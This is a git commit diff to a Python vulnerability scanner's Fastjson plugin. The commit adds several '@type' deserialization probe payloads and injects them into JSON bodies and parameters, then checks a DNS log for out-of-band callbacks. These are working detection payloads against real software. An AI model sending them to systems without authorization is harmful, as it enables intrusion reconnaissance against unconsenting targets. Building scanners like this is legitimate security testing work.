1b9192530a2757b782e0ab75e2c298d6386c6867
amcai <ai1102a428+mygithubproject@gmail.com>
2020-11-02 21:51:34 +0800

    fastjson_dnslog support param_value

--- myscan/pocs/perscheme/others_fastjson_dnslog_found.py
+++ myscan/pocs/perscheme/others_fastjson_dnslog_found.py
@@ -4,11 +4,13 @@
 # @File    : others_fastjson_dnslog_found.py
 
 from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
-from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
 from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
-from myscan.lib.core.common import get_random_str
+from myscan.lib.core.common import get_random_str, isjson
 from myscan.lib.core.base import PocBase
 from myscan.lib.core.common_reverse import generate, query_reverse
+from myscan.lib.core.const import notAcceptedExt
+from myscan.lib.core.threads import mythread
+from myscan.lib.core.data import cmd_line_options
 
 
 class POC(PocBase):
@@ -19,36 +21,70 @@ class POC(PocBase):
         self.name = "fastjson_dnslog_found"
         self.vulmsg = "可尝试反序列化payload"
         self.level = 1  # 0:Low  1:Medium 2:High
+        self.hexdatas = []
 
     def verify(self):
-        if not self.dictdata.get("request").get("content_type") == 4:  # data数据类型为json
+        if self.dictdata.get("url").get("extension") in notAcceptedExt:
             return
-        parse = dictdata_parser(self.dictdata)
-        if not self.can_output(parse.getrootpath() + self.name):  # 限定只输出一次
+        self.parse = dictdata_parser(self.dictdata)
+        if not self.can_output(self.parse.getrootpath() + self.name):  # 限定只输出一次
             return
 
-        payload_ = '''{"%(random_str)s": {"@type": "java.net.Inet4Address", "val": "%(domain)s"}}'''
+        # 针对参数为json格式
+        params = self.dictdata.get("request").get("params").get("params_url") + \
+                 self.dictdata.get("request").get("params").get("params_body")
+        test_args = []
+        for param in params:
+            arg = param.get("value", "")
+            if isjson(arg):
+                test_args.append(param)
 
-        random_str = get_random_str(6).lower()
-        _, domain_ = generate(parse.getfilepath(), "dns")
-        payload = payload_ % {"random_str": random_str, "domain": domain_}
+        # 针对body部分为json格式的数据包
+        if self.dictdata.get("request").get("content_type") == 4:  # data数据类型为json
+            test_args.append(None)
+        payloads = ['''{"RANDOM": {"@type": "java.net.Inet4Address", "val": "DOMAIN"}}''',
+                    '''Set[{"@type":"java.net.URL","val":"http://DOMAIN"}''',
+                    '''{{"@type":"java.net.URL","val":"http://DOMAIN"}:0''',
+                    '''{"@type":"java.net.InetSocketAddress"{"address":,"val":"DOMAIN"}}''',
+                    ]
+        if test_args:
+            datas = []
+            for payload in payloads:
+                for arg_ in test_args:
+                    datas.append((payload, arg_))
+            mythread(self.send_payload, datas, cmd_line_options.threads)
 
-        req = parse.generaterequest({"data": payload})
-        r = request(**req)
-        if r is not None:
-            res, res_data = query_reverse(domain_)
+        # query dns log
+        sleep = True
+        for param, hexdata in self.hexdatas:
+            res, res_data = query_reverse(hexdata, sleep)
+            sleep = False
             if res:
-                parser_ = response_parser(r)
                 self.result.append({
                     "name": self.name,
-                    "url": parser_.geturl(),
+                    "url": self.parse.getrootpath(),
                     "level": self.level,  # 0:Low  1:Medium 2:High
                     "detail": {
                         "vulmsg": self.vulmsg,
-                        "others": "{} in dnslog".format(domain_),
-                        "request": parser_.getrequestraw(),
-                        "response": parser_.getresponseraw()
+                        "others": "{} in dnslog".format(hexdata),
+                        "param": "no param ,body vuln" if param is None else param.get("name", ""),
+                        "request": self.parse.getrequestraw(),
+                        "response": self.parse.getresponseraw()
                     }
                 })
-                self.can_output(parse.getrootpath() + self.name, True)
+                self.can_output(self.parse.getrootpath() + self.name, True)
                 return
+
+    def send_payload(self, data):
+
+        payload, param = data
+        random_str = get_random_str(4).lower()
+        # dns 方式检测
+        _, hexdata = generate(self.parse.getfilepath(), "dns")
+        self.hexdatas.append((param, hexdata))
+        if param == None:
+            req = self.parse.generaterequest({"data": payload.replace("RANDOM", random_str).replace("DOMAIN", hexdata)})
+        else:
+            req = self.parse.getreqfromparam(param, "w",
+                                             payload.replace("RANDOM", random_str).replace("DOMAIN", hexdata))
+        request(**req)
